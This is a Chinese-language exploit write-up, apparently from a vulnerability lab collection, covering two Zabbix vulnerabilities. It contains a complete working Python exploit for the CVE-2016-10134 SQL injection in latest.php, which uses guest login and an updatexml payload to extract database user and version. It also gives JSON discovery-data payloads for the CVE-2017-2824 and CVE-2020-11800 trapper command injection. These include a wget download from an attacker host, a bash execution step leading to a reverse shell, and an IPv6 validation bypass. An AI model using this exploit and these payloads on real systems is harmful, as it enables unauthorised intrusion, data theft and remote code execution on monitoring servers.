1.Zabbix SQL注入漏洞（CVE-2016-10134）

影响版本 : Zabbix 2.2.* 3.0.0-3.0.3
Path : zabbix/CVE-2016-10134
Vul : SQL注入

Breakthrough
访问8080端口，发现能够guest免密码登陆系统。
注入点latest.php如下（需登陆系统，获取sid）：

# -*- coding: utf-8 -*-

import json

from optparse import OptionParser

import re
import sys

from requests import session

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

ss = session()
ss.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}


# python3 CVE-2016-10134.py --target 127.0.0.1:8080

def get_payload1(text) -> str:
   payload = re.search(r"\[(.*\))\]", text) //正则匹配 [(.*))]
   return payload.group(1)


def get_sql_injection_info(text) -> str:
   sql_injection_info = re.search(r"<\/li><li>(.*)\'\]", text)  //正则匹配 </li><li>(.*)']
   return sql_injection_info.group(1)


def attack(target):
   '''login zabbix'''
   login_url = "http://{}/index.php".format(target)

   ret0 = ss.get(login_url)

   cookie_dict = {i.name: i.value for i in ret0.cookies}
   # get sid
   sid = cookie_dict.get('zbx_sessionid')[16:] //取 zbx_sessionid 末16位

   data = {"sid": sid,
           "form_refresh": "1",
           "name": "",
           "password": "",
           "enter": "Sign+in"}

   retn = ss.post(url=login_url, headers=ss.headers, data=data) //以空账号密码登陆 target
   if retn.status_code == 200:
       # updatexml(0,concat(0xa,database()),0)
       # updatexml(0,concat(0xa,version()),0)
       payload1 = f"http://{target}/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)"

       retn2 = ss.get(url=payload1, headers=ss.headers)

       if retn2.status_code == 200:
           resp = {
               "payload": get_payload1(retn2.text),
               "info": get_sql_injection_info(retn2.text)
           }

           ret['status'] = 'success'
           ret['info'] = resp

   return ret


def main():
   usage = "Usage: python3 CVE-2016-10134.py --target <target ip:port>"
   parse = OptionParser(usage=usage)
   parse.add_option("-t", '--target', type="string", dest="target", help="server ip:port, e.g. 127.0.0.1:8080")

   options, args = parse.parse_args()

   if not options.target:
       ret['status'] = 'fail'
       ret['info'] = "target empty"
       print(usage)
       sys.exit()
   else:
       target = options.target

   try:
       attack(target)
   except Exception:
       ret['status'] = 'fail'

   print(json.dumps(ret))


if __name__ == '__main__':
   main()

2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)

影响版本 : Zabbix 2.4.7 - 2.4.8r1 & Zabbix 3.0.x - 3.0.30
Path : zabbix/CVE-2017-2824:/CVE-2020-11800
Vul : 命令执行

Breakthrough
该漏洞位于Zabbix中Trapper代码部分，它主要提供Proxies和Server之间通信的服务（TCP端口10051）。Zabbix Server向Zabbix Proxy提供一组API的调用，其中需要关注的是command requests和discovery data。这些请求的示例数据如下所示：

{"request":"command","scriptid":1,"hostid":10001}
{"request":"discovery data","host":"zabbix-proxy.com","clock":10,"data":[{"clock":10,"drule":1,"dcheck":2,"type":0,"ip":10.0.0.1,"dns":"zabbix-agent.com","port":10050,"key":"test","status":0,"value":"test_value"}]}

request命令调用位于Zabbix数据库中的脚本，并且不进行任何身份验证。
同时，默认情况下Zabbix 2.4.X 调用 script table 中的3个script来填充mysql数据库：
scriptid == 1 == /bin/ping -c {HOST.CONN} 2>&1
scriptid == 2 == /usr/bin/traceroute {HOST.CONN} 2>&1
scriptid == 3 == sudo /usr/bin/nmap -O {HOST.CONN} 2>&1

在调用脚本时，{HOST.CONN}字段会被host的IP地址替换。替换{HOST.CONN}的值（主机的IP地址）位于Zabbix的interface表中，然后保存成VARCHAR(64)类型的IP字段。
因此，如果创建一个命令注入payload作为IP地址保存在interface表中，并通过请求运行带有{HOST.CONN}的脚本，则会发生命令注入。
以上的执行前提是获得一个有效的入口进入Zabbix的host表。该行为需要Zabbix的管理员权限，使用Zabbix的Auto-discovery功能。
Zabbix的Auto-discovery功能和Auto-registration功能能够将Zabbix Proxy向Zabbix Server提供的数据作为Zabbix Server的配置。即，如果host向Zabbix Proxy提供某些特征数据，则由于上述特性，Zabbix Server将可能执行某些操作，其中可能会导致近期discovered主机被添加到Zabbix的某些数据库表中。当这种情况发生时。一个host会被插入到Zabbix的hosts表和interface表中，该host提供的IP地址会被插入到interface表的IP字段，并且不会对该IP地址进行任何验证。
综上所述，通过向Zabbix Server发送discovery data请求包含一个带有命令注入payload的host，就可以将命令注入payload插入到Zabbix数据库中：
write_script_cmd='{
   "request":"discovery data",
   "host":"zabbix-proxy.domain.fake",
   "clock":148535399,
   "data":[{
       "clock":1485353070,
       "drule":88,
       "dcheck":174,
       "type":0,
       "ip":";wget -O /tmp/s http://attacker-ip/s;#", //携带命令注入payload的ip地址参数
       "dns":"host28.domain.fake",
       "port":10050,
       "key":"sectest",
       "status":0,
       "value":"cyy<(^^)>host"
   }]
}'

由于Zabbix的interface表的ip字段存在大小限制VARCHAR(64)，第二个host被插入到另一个ip地址的表中。
// Host 2
"ip":";/bin/bash /tmp/s;#"

当两个host均被插入后，需要知道command requests的hostid。由于host存在与否的响应不同，可以通过暴力回溯数据库来获取携带命令注入payload的host的hostid，并调用command request后，则能够得到一个反射shell。
(CVE-2017-2824)修复后，对传入的ip地址参数做了格式校验。(CVE-2020-11800)在其基础上，由于ipv6的检验存在漏洞，故能够通过以下payload进行绕过：
"ip":"ffff:::;touch /tmp/success" // /tmp目录新增文件success
